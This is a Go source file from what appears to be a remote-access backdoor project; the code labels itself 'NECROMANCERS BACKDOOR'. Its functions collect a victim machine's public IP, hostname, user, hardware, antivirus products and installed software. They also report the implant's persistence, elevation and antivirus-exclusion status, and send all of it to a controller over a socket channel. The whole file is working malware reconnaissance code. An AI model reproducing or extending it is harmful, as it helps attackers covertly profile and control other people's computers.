package commands

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/user"
	"runtime"
	"strings"
	"time"

	"github.com/whiterabb17/greatwhite/modules/install"
	"github.com/whiterabb17/greatwhite/modules/util"

	gophersocket "github.com/whiterabb17/gopher-socket"
	"github.com/whiterabb17/greatwhite/modules/models"
)

const (
	fmtInfo = "IP Address:\t   %s\n Computer name:\t%s\n Username:\t\t [%s] %s\n Operating System: %s %s\n " +
		"CPU:\t\t      %s\n GPU:\t\t      %s\n Memory:\t\t   %s\n AV:\t\t       %s\n"
	softInfo = "```\nInstalled Software:\n    %s```"
	fmtInst  = "%s ```md\n <Version:\t     %s>\n <IIFLoaded:\t   %v>\n <Base:\t %s>\n <InstallDate:\t %s>\n <Persistence:\t %d>\n <Elevated:\t    %v>\n <Excluded:\t    %v>```"
)

func InitInfo() string {
	resp, err := http.Get(util.IPProvider)
	util.Handle(err)
	defer resp.Body.Close()

	ipb, err := ioutil.ReadAll(resp.Body)
	util.Handle(err)
	ip := strings.TrimSpace(string(ipb))

	host, _ := os.Hostname()
	usr, _ := user.Current()

	avs := strings.Replace(util.AntiInfo(), "\n", "\n    ", -1)
	//avs := "[!] Reimplementing this Logic"
	cfg := fmt.Sprintf(fmtInfo,
		ip, host, usr.Name, usr.Username,
		runtime.GOOS, runtime.GOARCH, util.CPUInfo(),
		util.GPUInfo(), util.MemoryInfo(), avs,
	)
	return cfg
}

func Info() string {
	resp, err := http.Get(util.IPProvider)
	util.Handle(err)
	defer resp.Body.Close()

	ipb, err := ioutil.ReadAll(resp.Body)
	util.Handle(err)
	ip := strings.TrimSpace(string(ipb))

	host, _ := os.Hostname()
	usr, _ := user.Current()

	avs := strings.Replace(util.AntiInfo(), "\n", "\n    ", -1)
	//avs := "[!] Reimplementing this Logic"
	cfg := fmt.Sprintf(fmtInfo,
		ip, host, usr.Name, usr.Username,
		runtime.GOOS, runtime.GOARCH, util.CPUInfo(),
		util.GPUInfo(), util.MemoryInfo(), avs,
	)
	return "```\n\t\t [System Info] ``` ```\n " + cfg + "```"
}

func Software(channel *gophersocket.Channel, selfTag string) {
	soft := util.SoftwareInfo()
	channel.Emit("repl", models.Resp{Resp: "```" + soft + "```", Tag: selfTag})
}

func InstanceInfo(channel *gophersocket.Channel, selfTag string) {
	instStr := fmt.Sprintf(fmtInst,
		"```css\n\t\t\t\t\t\t\t\t\t\t\t[*NECROMANCERS BACKDOOR*]```",
		util.Version,
		install.Info.Loaded,
		install.Info.Base,
		strings.Split(strings.Replace(time.Now().Format(time.RFC3339), "T", " ", 1), "+")[0],
		install.Info.PType,
		util.RunningAsAdmin(),
		install.Info.Exclusion,
	)
	channel.Emit("repl", models.Resp{Resp: instStr, Tag: selfTag})
}
